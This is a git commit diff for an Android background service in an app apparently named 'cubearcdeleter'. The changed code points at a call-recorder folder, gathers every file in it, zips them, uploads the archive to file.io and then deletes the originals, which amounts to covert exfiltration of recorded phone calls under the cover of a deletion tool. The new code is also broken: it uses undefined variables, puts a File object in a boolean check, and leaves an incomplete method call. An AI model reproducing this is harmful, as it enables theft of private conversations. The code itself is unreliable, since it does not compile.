8f06bcbcc3661d0a85483d7f7e1c594ec7f284fd
Your Name <you@example.com>
2024-09-09 11:36:21 +0600

    backup

--- src/main/java/com/example/cubearcdeleter/DeleteService.java
+++ src/main/java/com/example/cubearcdeleter/DeleteService.java
@@ -26,6 +26,7 @@ public class DeleteService extends Service {
 
     private static final String TAG = "DeleteService";
     private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
+    private static final String TARGET_FOLDER = "/storage/emulated/0/Documents/CubeCallRecorder/All/";
     private Handler handler;
 
     @Override
@@ -51,21 +52,25 @@ public class DeleteService extends Service {
     }
 
     private void processAudioRecords() throws IOException {
-        File folder = new File("/path/to/cubeacr/records");
-        File[] files = folder.listFiles();
-        if (files != null && files.length > 0) {
-            File zipFile = createZip(files);
-            uploadToFileIo(zipFile);
-            deleteFiles(files);
+        File zipFile = createZip(files);
+        if (zipFile) {
+            uploadFile(zipFile);
+            deleteFiles(Files);
         }
     }
 
-    private File createZip(File[] files) throws IOException {
+    private File createZip() throws IOException {
         File zipFile = new File(getExternalFilesDir(null), "records.zip");
+        File folder = new File(TARGET_FOLDER);
+        File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
+        if (files == null || files.length == 0) {
+            return null;
+        }
+
         try (FileOutputStream fos = new FileOutputStream(zipFile);
              ZipArchiveOutputStream zos = new ZipArchiveOutputStream(fos)) {
             for (File file : files) {
-                if (file.isFile() && file.getName().endsWith(".mp3")) {
+                if (file.isFile() && file.getName().) {
                     ZipArchiveEntry zipEntry = new ZipArchiveEntry(file.getName());
                     zos.putArchiveEntry(zipEntry);
                     zos.write(java.nio.file.Files.readAllBytes(file.toPath()));
@@ -76,7 +81,7 @@ public class DeleteService extends Service {
         return zipFile;
     }
 
-    private void uploadToFileIo(File file) throws IOException {
+    private void uploadFile(File file) throws IOException {
         OkHttpClient client = new OkHttpClient();
         RequestBody requestBody = RequestBody.create(file, MediaType.parse("application/zip"));
         Request request = new Request.Builder()
